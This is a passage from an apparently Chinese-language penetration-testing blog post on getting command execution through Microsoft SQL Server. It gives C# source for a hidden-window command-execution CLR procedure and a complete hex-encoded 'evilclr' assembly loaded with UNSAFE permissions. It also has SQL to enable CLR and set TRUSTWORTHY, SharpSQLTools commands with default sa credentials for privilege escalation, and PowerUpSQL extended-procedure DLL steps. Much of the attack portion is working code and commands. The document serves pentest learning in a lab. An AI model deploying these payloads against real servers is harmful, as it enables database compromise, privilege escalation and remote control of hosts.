class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword type-declaration\">string</span> <span class=\"token function\">RunCommand</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">string</span> filename<span class=\"token punctuation\">,</span><span class=\"token keyword type-declaration\">string</span> arguments<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">var</span> process <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        process<span class=\"token operator\">.</span>StartInfo<span class=\"token operator\">.</span>FileName <span class=\"token operator\">=</span> filename<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">.</span><span class=\"token function\">IsNullOrEmpty</span><span class=\"token punctuation\">(</span>arguments<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            process<span class=\"token operator\">.</span>StartInfo<span class=\"token operator\">.</span>Arguments <span class=\"token operator\">=</span> arguments<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        process<span class=\"token operator\">.</span>StartInfo<span class=\"token operator\">.</span>CreateNoWindow <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n        process<span class=\"token operator\">.</span>StartInfo<span class=\"token operator\">.</span>WindowStyle <span class=\"token operator\">=</span> ProcessWindowStyle<span class=\"token operator\">.</span>Hidden<span class=\"token punctuation\">;</span>\n        process<span class=\"token operator\">.</span>StartInfo<span class=\"token operator\">.</span>UseShellExecute <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n\n        process<span class=\"token operator\">.</span>StartInfo<span class=\"token operator\">.</span>RedirectStandardError <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n        process<span class=\"token operator\">.</span>StartInfo<span class=\"token operator\">.</span>RedirectStandardOutput <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">var</span> stdOutput <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">StringBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        process<span class=\"token operator\">.</span>OutputDataReceived <span class=\"token operator\">+=</span> <span class=\"token punctuation\">(</span>sender<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> stdOutput<span class=\"token operator\">.</span><span class=\"token function\">AppendLine</span><span class=\"token punctuation\">(</span>args<span class=\"token operator\">.</span>Data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword type-declaration\">string</span> stdError <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">try</span>\n        <span class=\"token punctuation\">&#123;</span>\n            process<span class=\"token operator\">.</span><span class=\"token function\">Start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            process<span class=\"token operator\">.</span><span class=\"token function\">BeginOutputReadLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            stdError <span class=\"token operator\">=</span> process<span class=\"token operator\">.</span>StandardError<span class=\"token operator\">.</span><span class=\"token function\">ReadToEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            process<span class=\"token operator\">.</span><span class=\"token function\">WaitForExit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            SqlContext<span class=\"token operator\">.</span>Pipe<span class=\"token operator\">.</span><span class=\"token function\">Send</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">.</span>Message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>process<span class=\"token operator\">.</span>ExitCode <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            SqlContext<span class=\"token operator\">.</span>Pipe<span class=\"token operator\">.</span><span class=\"token function\">Send</span><span class=\"token punctuation\">(</span>stdOutput<span class=\"token operator\">.</span><span class=\"token function\">ToString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">else</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">var</span> message <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">StringBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">.</span><span class=\"token function\">IsNullOrEmpty</span><span class=\"token punctuation\">(</span>stdError<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                message<span class=\"token operator\">.</span><span class=\"token function\">AppendLine</span><span class=\"token punctuation\">(</span>stdError<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>stdOutput<span class=\"token operator\">.</span>Length <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                message<span class=\"token operator\">.</span><span class=\"token function\">AppendLine</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Std output:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                message<span class=\"token operator\">.</span><span class=\"token function\">AppendLine</span><span class=\"token punctuation\">(</span>stdOutput<span class=\"token operator\">.</span><span class=\"token function\">ToString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            SqlContext<span class=\"token operator\">.</span>Pipe<span class=\"token operator\">.</span><span class=\"token function\">Send</span><span class=\"token punctuation\">(</span>filename <span class=\"token operator\">+</span> arguments <span class=\"token operator\">+</span> <span class=\"token string double-quoted-string\">\" finished with exit code = \"</span> <span class=\"token operator\">+</span> process<span class=\"token operator\">.</span>ExitCode <span class=\"token operator\">+</span> <span class=\"token string double-quoted-string\">\": \"</span> <span class=\"token operator\">+</span> message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> stdOutput<span class=\"token operator\">.</span><span class=\"token function\">ToString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>编译后，即可导入程序集并且创建执行命令存储过程的sql语句。（正常的话我们此时就可以得到一个dll文件，而后直接导入到程序集中，但我这里并未成功编译，期间遇见了一些报错也未能解决，所以后续采用<code>Y4er</code>大师傅的字节流导入的方式来进行CLR的利用）</p>\n<h3 id=\"具体利用-2\"><a href=\"#具体利用-2\" class=\"headerlink\" title=\"具体利用\"></a>具体利用</h3><p>首先我们需要开启<code>CLR</code>(默认关闭)，具体代码如下所示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">sp_configure <span class=\"token string single-quoted-string\">'clr enabled'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span>\n<span class=\"token constant\">GO</span>\n<span class=\"token constant\">RECONFIGURE</span>\n<span class=\"token constant\">GO</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546947.png\" alt=\"在这里插入图片描述\"><br>然后我们这里导入的程序集的话是从外部导入的，默认是不安全的，所以我们需要执行语句来使得这个程序集被标注为安全的，具体代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">ALTER</span> <span class=\"token constant\">DATABASE</span> master <span class=\"token constant\">SET</span> <span class=\"token constant\">TRUSTWORTHY</span> <span class=\"token constant\">ON</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546229.png\" alt=\"在这里插入图片描述\"><br>接下来我们就可以导入我们的程序集了，我们这里采用字节流的方式进行导入</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">CREATE</span> <span class=\"token constant\">ASSEMBLY</span> <span class=\"token punctuation\">[</span>quq<span class=\"token punctuation\">]</span>\n    <span class=\"token constant\">AUTHORIZATION</span> <span class=\"token punctuation\">[</span>dbo<span class=\"token punctuation\">]</span>\n    <span class=\"token constant\">FROM</span> <span class=\"token number\">0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C01030068BBB65D0000000000000000E00022200B013000000E000000060000000000004E2C0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000FC2B00004F00000000400000A002000000000000000000000000000000000000006000000C000000C42A00001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000540C000000200000000E000000020000000000000000000000000000200000602E72737263000000A0020000004000000004000000100000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000302C00000000000048000000020005007C220000480800000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000CA00280600000A72010000706F0700000A00280600000A7243000070725300007002280800000A28020000066F0700000A002A001B300600BC0100000100001173040000060A00730900000A0B076F0A00000A026F0B00000A0003280C00000A16FE010D092C0F00076F0A00000A036F0D00000A0000076F0A00000A176F0E00000A00076F0A00000A176F0F00000A00076F0A00000A166F1000000A00076F0A00000A176F1100000A00076F0A00000A176F1200000A0006731300000A7D010000040706FE0605000006731400000A6F1500000A00140C00076F1600000A26076F1700000A00076F1800000A6F1900000A0C076F1A00000A0000DE18130400280600000A11046F1B00000A6F0700000A0000DE00076F1C00000A16FE01130511052C1D00280600000A067B010000046F1D00000A6F0700000A000038AA00000000731300000A130608280C00000A16FE01130711072C0B001106086F1E00000A2600067B010000046F1F00000A16FE03130811082C22001106725D0000706F1E00000A261106067B010000046F1D00000A6F1E00000A2600280600000A1C8D0E000001251602A2251703A225187275000070A22519076F1C00000A13091209282000000AA2251A72AD000070A2251B1106252D0426142B056F1D00000AA2282100000A6F0700000A0000067B010000046F1D00000A130A2B00110A2A011000000000970025BC0018080000012202282200000A002A4E027B01000004046F2300000A6F1E00000A262A00000042534A4201000100000000000C00000076322E302E35303732370000000005006C000000A8020000237E000014030000B003000023537472696E677300000000C4060000B4000000235553007807000010000000234755494400000088070000C000000023426C6F620000000000000002000001571502000902000000FA0133001600000100000014000000030000000100000005000000050000002300000005000000010000000100000003000000010000000000CC0101000000000006006601B60206008601B60206003C01A3020F00D602000006003803D8010A0050014E020E001103A3020600DF01D80106002002760306002101B6020E00F602A3020A0082034E020A0019014E020600BA01D8010E00F701A3020E00C800A3020E003502A30206000802360006001502360006002700D801000000002D00000000000100010001001000E5020000150001000100030110000100000015000100040006006C037900502000000000960083007D00010084200000000096008F001A0002005C220000000086189D02060004005C220000000086189D0206000400652200000000830016008200040000000100750000000100E800000002002703000001002E02000002000C0309009D02010011009D02060019009D020A0031009D02060051009D02060061001001100069009A001500710031031A0039009D0206003900E90132007900DB0015007100A003370079001903150079008D033C007900B80041007900A4013C00790083023C00790051033C0049009D02060089009D02470039005E004D0039004B0353003900F1000600390071025700990079005C0039003F0306004100AC005C0039009F0060002900B8015C004900050164004900C1016000A100B8015C00710031036A0029009D02060059004C005C0020002300BA002E000B0089002E00130092002E001B00B10063002B00BA00200004800000000000000000000000000000000069020000020000000000000000000000700055000000000002000000000000000000000070004000000000000200000000000000000000007000D80100000000030002000000003C3E635F5F446973706C6179436C617373315F30003C52756E436F6D6D616E643E625F5F3000496E743332003C4D6F64756C653E0053797374656D2E494F0053797374656D2E44617461006765745F44617461006D73636F726C6962006164645F4F757470757444617461526563656976656400636D640052656164546F456E640045786563436F6D6D616E640052756E436F6D6D616E640053656E64006765745F45786974436F6465006765745F4D657373616765007365745F57696E646F775374796C650050726F6365737357696E646F775374796C65007365745F46696C654E616D650066696C656E616D6500426567696E4F7574707574526561644C696E6500417070656E644C696E65006765745F506970650053716C5069706500436F6D70696C657247656E6572617465644174747269627574650044656275676761626C654174747269627574650053716C50726F63656475726541747472696275746500436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C4578656375746500546F537472696E67006765745F4C656E677468006576696C636C722E646C6C0053797374656D00457863657074696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D526561646572005465787452656164657200537472696E674275696C6465720073656E646572004461746152656365697665644576656E7448616E646C6572004D6963726F736F66742E53716C5365727665722E536572766572006576696C636C72006765745F5374616E646172644572726F72007365745F52656469726563745374616E646172644572726F72002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053746F72656450726F63656475726573004461746152656365697665644576656E744172677300617267730050726F63657373007365745F417267756D656E747300617267756D656E747300436F6E636174004F626A6563740057616974466F7245786974005374617274007365745F52656469726563745374616E646172644F7574707574007374644F75747075740053797374656D2E546578740053716C436F6E74657874007365745F4372656174654E6F57696E646F770049734E756C6C4F72456D707479000000004143006F006D006D0061006E0064002000690073002000720075006E006E0069006E0067002C00200070006C006500610073006500200077006100690074002E00000F63006D0064002E00650078006500000920002F0063002000001753007400640020006F00750074007000750074003A0000372000660069006E00690073006800650064002000770069007400680020006500780069007400200063006F006400650020003D00200000053A00200000001E897910CE56A742B9629E72009C5099000420010108032000010520010111110400001235042001010E0500020E0E0E11070B120C121D0E0212210212250202080E042000123D040001020E0420010102052001011141052002011C180520010112450320000204200012490320000E0320000805200112250E0500010E1D0E08B77A5C561934E08903061225040001010E062002011C122D0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000701000000000401000000000000000068BBB65D00000000020000001C010000E02A0000E00C0000525344534FDE46A4C9F4284FAAE5619111BF655C01000000453A5C636F64655C6373686172705C6576696C636C725C6576696C636C725C6F626A5C44656275675C6576696C636C722E70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000242C000000000000000000003E2C0000002000000000000000000000000000000000000000000000302C0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF2500200010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100100000001800008000000000000000000000000000000100010000003000008000000000000000000000000000000100000000004800000058400000440200000000000000000000440234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004A4010000010053007400720069006E006700460069006C00650049006E0066006F0000008001000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E003000000038000C00010049006E007400650072006E0061006C004E0061006D00650000006500760069006C0063006C0072002E0064006C006C0000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000040000C0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006500760069006C0063006C0072002E0064006C006C000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E00300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000503C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span>\n    <span class=\"token constant\">WITH</span> <span class=\"token constant\">PERMISSION_SET</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UNSAFE</span><span class=\"token punctuation\">;</span>\ngo<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546262.png\" alt=\"在这里插入图片描述\"><br>然后创建存储过程</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">CREATE</span> <span class=\"token constant\">PROCEDURE</span> <span class=\"token punctuation\">[</span>dbo<span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token punctuation\">[</span>ExecCommand<span class=\"token punctuation\">]</span>\n@cmd <span class=\"token function\">NVARCHAR</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">MAX</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">AS</span> <span class=\"token constant\">EXTERNAL</span> <span class=\"token constant\">NAME</span> <span class=\"token punctuation\">[</span>quq<span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token punctuation\">[</span>StoredProcedures<span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token punctuation\">[</span>ExecCommand<span class=\"token punctuation\">]</span>\ngo<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546273.png\" alt=\"在这里插入图片描述\"><br>接下来就可以去执行命令<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546294.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"扩展（SharpSQLTools）\"><a href=\"#扩展（SharpSQLTools）\" class=\"headerlink\" title=\"扩展（SharpSQLTools）\"></a>扩展（SharpSQLTools）</h3><p>有大师傅开发了针对<code>mssql CLR</code>进行利用的渗透工具，工具链接如下<br><a href=\"https://github.com/uknowsec/SharpSQLTools\">https://github.com/uknowsec/SharpSQLTools</a><br>可以进行下载(上传)文件、反弹shell、提权，cs上线等操作。</p>\n<p>这里采用<code>CLR</code>提权，只需三步即可</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">SharpSQLTools<span class=\"token operator\">.</span>exe <span class=\"token number\">10.10</span><span class=\"token number\">.10</span><span class=\"token number\">.18</span> sa sa master install_clr\nSharpSQLTools<span class=\"token operator\">.</span>exe <span class=\"token number\">10.10</span><span class=\"token number\">.10</span><span class=\"token number\">.18</span> sa sa master enable_clr\nSharpSQLTools<span class=\"token operator\">.</span>exe <span class=\"token number\">10.10</span><span class=\"token number\">.10</span><span class=\"token number\">.18</span> sa sa master clr_efspotato whoami<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://img-blog.csdnimg.cn/c8a9f1a0f4474eb591af77af7e4190b2.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546538.png\" alt=\"在这里插入图片描述\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注：图片来自本人打的某个内网靶机，有兴趣的师傅可以去看看<a href=\"https://xz.aliyun.com/t/11588#toc-0\">https://xz.aliyun.com/t/11588#toc-0</a></p></blockquote>\n<p>同时，也有师傅对此进行了二开改写，写出了<code>SharpSQLToolsGUI</code>工具，工具链接如下<br><a href=\"https://github.com/RowTeam/SharpSQLTools\">https://github.com/RowTeam/SharpSQLTools</a><br>通过这个GUI工具，可以更直观的看到文件界面，上传和下载文件更快速简洁一些，当我们将Cs生成的马上线到可写目录后，再去执行此文件，即可实现Cs上线<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546596.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"PowerUpSQL\"><a href=\"#PowerUpSQL\" class=\"headerlink\" title=\"PowerUpSQL\"></a>PowerUpSQL</h2><p>这个是针对<code>Mssql</code>进行攻击的一个强大工具，工具链接如下<br><a href=\"https://github.com/NetSPI/PowerUpSQL\">https://github.com/NetSPI/PowerUpSQL</a><br>这里介绍几种常用的方式，更多的方法可参考<br><a href=\"https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet\">https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet</a></p>\n<h3 id=\"SP-Addextendedproc\"><a href=\"#SP-Addextendedproc\" class=\"headerlink\" title=\"SP_Addextendedproc\"></a>SP_Addextendedproc</h3><p>这个主要是使用了套件中的<code>Create-SQLFileXpDll</code>方法，它的大概思想就是创建一个dll文件，然后我们通过执行dll文件将内容写到一个文件中从而达到一个命令执行的效果，其方法具体为以下几步</p>\n<p>首先我们需要创建dll文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">PS</span> <span class=\"token constant\">E</span><span class=\"token punctuation\">:</span>\\工具\\PowerUpSQL<span class=\"token operator\">-</span>master\\PowerUpSQL<span class=\"token operator\">-</span>master<span class=\"token operator\">></span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span>\\PowerUpSQL<span class=\"token operator\">.</span>ps1\n<span class=\"token constant\">PS</span> <span class=\"token constant\">E</span><span class=\"token punctuation\">:</span>\\工具\\PowerUpSQL<span class=\"token operator\">-</span>master\\PowerUpSQL<span class=\"token operator\">-</span>master<span class=\"token operator\">></span> Create<span class=\"token operator\">-</span>SQLFileXpDll <span class=\"token operator\">-</span>OutFile <span class=\"token constant\">D</span><span class=\"token punctuation\">:</span>\\exec<span class=\"token operator\">.</span>dll <span class=\"token operator\">-</span>Command <span class=\"token string double-quoted-string\">\"echo Exec test > C:\\test.txt\"</span> <span class=\"token operator\">-</span>ExportName xp_test<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546619.png\" alt=\"在这里插入图片描述\"><br>接下来我们需要去导入并调用dll文件，<code>SQL Server </code>通过<code> sp_addextendedproc</code> 调用DLL从而达到命令执行的效果。这里有两种方式导入：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">//via local disk</span>\nsp_addextendedproc <span class=\"token string single-quoted-string\">'xp_test'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'D:\\exec.dll'</span>\n<span class=\"token comment\">//via UNC path:</span>\nsp_addextendedproc <span class=\"token string single-quoted-string\">'xp_test'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\\\servername\\pathtofile\\exec.dll'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546650.png\" alt=\"在这里插入图片描述\"><br>导入后，接下来就可以调用<code>xp_test</code>来执行命令</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">exec master<span class=\"token operator\">.</span><span class=\"token operator\">.</span>xp_test<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546899.png\" alt=\"在这里插入图片描述\"><br>正常情况应该是这样<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546938.png\" alt=\"在这里插入图片描述\"><br>但我这里并未在C盘出现文件，可能是因为当前登录用户为普通用户，在C盘没有可写权限。<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546977.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"Agent-Job执行命令\"><a href=\"#Agent-Job执行命令\" class=\"headerlink\" title=\"Agent Job执行命令\"></a>Agent Job执行命令</h2><h3 id=\"概念-3\"><a href=\"#概念-3\" class=\"headerlink\" 